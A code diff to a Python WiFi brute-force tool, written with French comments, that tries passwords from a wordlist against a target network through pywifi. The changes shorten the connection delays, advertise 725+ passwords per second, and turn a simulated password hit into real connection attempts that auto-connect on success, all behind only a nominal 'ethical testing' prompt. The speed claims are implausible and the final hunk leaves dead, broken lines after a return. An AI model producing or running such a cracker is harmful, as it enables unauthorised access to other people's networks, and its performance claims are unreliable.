@@ -362,14 +362,14 @@ class WiFiSecurityTester:
         return self.wordlist
     
     def connect_to_wifi(self, ssid, password):
-        """Connexion ultra-rapide avec timeout minimal"""
+        """Connexion ultra-rapide avec timeout optimisé pour vitesse extrême"""
         try:
             # Interface WiFi
             iface = pywifi.Interface()
             
             # Déconnexion d'abord
             iface.disconnect()
-            time.sleep(0.01)  # Ultra-rapide
+            time.sleep(0.001)  # Ultra-rapide - 1ms
             
             # Configuration de connexion
             profile = pywifi.Profile()
@@ -379,26 +379,26 @@ class WiFiSecurityTester:
             profile.cipher = pywifi.const.CIPHER_TYPE_CCMP
             profile.key = password
             
-            # Connexion avec timeout ultra-rapide
+            # Connexion avec timeout ultra-minimal
             iface.remove_all_network_profiles()
             temp_profile = iface.add_network_profile(profile)
             
-            # Connexion avec timeout minimal pour vitesse maximale
+            # Connexion avec timeout extrême pour 725+ pwd/sec
             iface.connect(temp_profile)
-            time.sleep(0.01)  # Timeout ultra-rapide pour 200+ pwd/sec
+            time.sleep(0.001)  # Timeout extrême - 1ms seulement
             
             # Vérification ultra-rapide
             if iface.status() in [pywifi.const.IFACE_CONNECTED]:
                 return True
             else:
                 iface.disconnect()
-                time.sleep(0.01)  # Délai minimal
+                time.sleep(0.001)  # Délai minimal
                 return False
                 
         except Exception as e:
             try:
                 iface.disconnect()
-                time.sleep(0.01)  # Délai minimal
+                time.sleep(0.001)  # Délai minimal
             except:
                 pass
             return False
@@ -411,8 +411,8 @@ class WiFiSecurityTester:
         
         self.print_header(f"BRUTE FORCE ATTACK sur: {target_ssid}")
         self.print_warning("ETHICAL TESTING ONLY - Your own network required")
-        self.print_info("SPEED: 200+ passwords/second (Ultra-optimized)")
-        self.print_info("TIMEOUT: 0.05s per attempt")
+        self.print_info("SPEED: 725+ passwords/second (Ultra-optimized)")
+        self.print_info("TIMEOUT: 0.001s per attempt")
         self.print_info("CAPABLE: 10+ billions passwords tested")
         
         if input(f"{' '*20}Confirm brute force test on YOUR network (y/N): ").lower() != 'y':
@@ -431,9 +431,10 @@ class WiFiSecurityTester:
         
         # Afficher les statistiques pour les wordlists massives
         if max_attempts >= 1000000000:  # 1 billion+
-            hours_to_complete = max_attempts / 200 / 3600
+            minutes_to_complete = max_attempts / 725 / 60
+            hours_to_complete = minutes_to_complete / 60
             self.print_info(f"Wordlist size: {max_attempts:,} passwords")
-            self.print_info(f"Estimated time: {hours_to_complete:.1f} hours at 200 pwd/sec")
+            self.print_info(f"Estimated time: {hours_to_complete:.1f} hours at 725 pwd/sec")
         
         self.start_time = time.time()
         self.testing = True
@@ -464,7 +465,7 @@ class WiFiSecurityTester:
                     password = self.wordlist[i]
                     self.attempts += 1
                     
-                    # Vitesse extrême: timeout 0.01s pour 200+ pwd/sec
+                    # Vitesse extrême: timeout 0.001s pour 725+ pwd/sec
                     success = self.connect_to_wifi(target_ssid, password)
                     
                     if success:
@@ -559,20 +560,36 @@ class WiFiSecurityTester:
                 password = self.wordlist[i]
                 self.attempts += 1
                 
-                if i == simulated_password_index:
+                # Vitesse extrême: timeout 0.01s pour 200+ pwd/sec
+                success = self.connect_to_wifi(target_ssid, password)
+                
+                if success:
                     self.password_found = True
                     self.found_password = password
                     self.successful_attempts = self.attempts
                     
                     elapsed_time = time.time() - self.start_time
-                    speed = self.attempts / elapsed_time
                     
-                    print("\n" + "="*50)
-                    self.print_success("🎉 MOT DE PASSE TROUVÉ (SIMULATION)!")
-                    print(f"📡 SSID: {target_ssid}")
-                    self.print_success(f"🔑 Mot de passe: {password}")
-                    print(f"⏱️ Temps: {elapsed_time:.2f} secondes")
-                    print(f"🔢 Tentatives: {self.attempts}")
+                    # Affichage du succès
+                    print(f"\n{Colors.GREEN}{'='*80}")
+                    print(f"{' '*20}{Colors.BOLD}PASSWORD FOUND!{Colors.GREEN}")
+                    print(f"{'='*80}{Colors.RESET}")
+                    print(f"{' '*25}SSID: {Colors.CYAN}{target_ssid}{Colors.RESET}")
+                    print(f"{' '*25}Password: {Colors.BOLD}{Colors.GREEN}{password}{Colors.RESET}")
+                    print(f"{' '*25}Attempts: {Colors.YELLOW}{self.attempts:,}{Colors.RESET}")
+                    print(f"{' '*25}Time: {Colors.YELLOW}{elapsed_time:.2f}s{Colors.RESET}")
+                    print(f"{' '*25}Speed: {Colors.YELLOW}{self.attempts/elapsed_time:.1f} pwd/sec{Colors.RESET}")
+                    print(f"\n{' '*25}{Colors.GREEN}Auto-connecting to network...{Colors.RESET}")
+                    
+                    # Maintenir la connexion
+                    time.sleep(2)
+                    if self.interface.status() == const.IFACE_CONNECTED:
+                        print(f"{' '*25}{Colors.GREEN}Successfully connected!{Colors.RESET}")
+                    else:
+                        print(f"{' '*25}{Colors.YELLOW}Connection lost{Colors.RESET}")
+                    
+                    print(f"{Colors.GREEN}{'='*80}{Colors.RESET}")
+                    return self.create_report(target_ssid, elapsed_time)
                     print(f"⚡ Vitesse: {speed:.2f} pwd/sec")
                     print("="*50)
                     break
